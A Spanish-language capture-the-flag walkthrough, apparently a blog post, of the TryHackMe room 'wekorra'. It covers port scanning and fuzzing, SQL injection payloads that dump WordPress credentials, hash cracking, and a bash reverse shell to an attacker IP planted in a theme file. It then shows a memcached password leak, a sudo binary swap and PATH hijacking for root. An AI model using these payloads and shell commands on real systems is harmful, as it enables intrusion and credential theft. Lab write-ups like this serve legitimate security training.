---
title: "wekorra"
description: "wekorra"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/wekorra

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.236.132
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531155032.png)

## Reconocimiento de servicios

````
nmap -sCV -p22,80 10.10.236.132
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531155118.png)

## Fuzzing

En /robots.txt
Encontramos haciendo búsquedas una web en /it-next

````
wfuzz -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t30 --hw 3 -H "Host:FUZZ.wekor.thm" "http://wekor.thm/"
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531161205.png)![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531161311.png)

````
gobuster dir -u http://site.wekor.thm -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531161517.png)

# Fase de ataque

## SQLI

El cupon es vulnerable a SQLI
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531162432.png)
Encontramos la cantidad de 3 columnas

````
' order by 3-- -
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531162903.png)
Ver bases de datos

````
' union select 1,2,group_concat(schema_name) from information_schema.schemata-- -
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531163111.png)Buscamos credenciales del wordpress
Ver las tablas de una BBDD

````
' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='wordpress'-- -
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531163616.png)
Ver las columnas de un tabla

````
' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='wordpress' and table_name='wp_users'-- -
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531163726.png)
Ver contenido de las columnas

````
' union select 1,2,group_concat(user_login,user_pass,display_name) from wordpress.wp_users-- -
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531164924.png)

## Crack Hash

````
hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531165719.png)

## Wordpress

Logging con wp_yura

## Reverse Shell

Editamos el Tema 404.php e insertamos una reverse shell

````
system("bash -c 'bash -i >& /dev/tcp/10.9.2.28/443 0>&1'");
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531190415.png)
Nos ponemos en escucha por el puerto 443

````
nc -nlvp 443
````

\[-\] ==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

Ajustar proporciones

````
stty rows 44 columns 184
````

# Privilege Escalation

## Enumerar

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531191237.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531191825.png)

## memcached service vulnerability

Ver credenciales

````
telnet 127.0.0.1 11211
OrkAiSC00L24/7$
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531192518.png)
Iniciar sesión
\[-\] ==pwned!==

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531193314.png)

````
sudo -u root /home/Orka/Desktop/bitcoin
````

Mira
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531194920.png)

## Primer método

Hacemos que ejecute el /bin/bash

````
mv Desktop old
mkdir Desktop
cp /bin/bash ./Desktop/bitcoin
sudo -u root /home/Orka/Desktop/bitcoin
````

\[+\] ==pwned!==

## Segundo método

Usamos la herramienta de ingeniería reversa llamada Ghidra

## Ghidra

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240531214950.png)
Encontramos la contraseña y vemos que ejecuta python sin ruta absoluta
Modificamos para que ejecute el Python en un archivo malicioso.

1. Creamos un archivo llamado python en /tmp

````
#!/bin/bash
/bin/bash
````

2. Le damos permiso

````
chmod 777 python
````

3. Lo exportamos al PATH

````
export PATH=/tmp:$PATH
````

4. Ejecutamos

````
sudo -u root /home/Orka/Desktop/bitcoin
````

\[+\] ==pwned!==
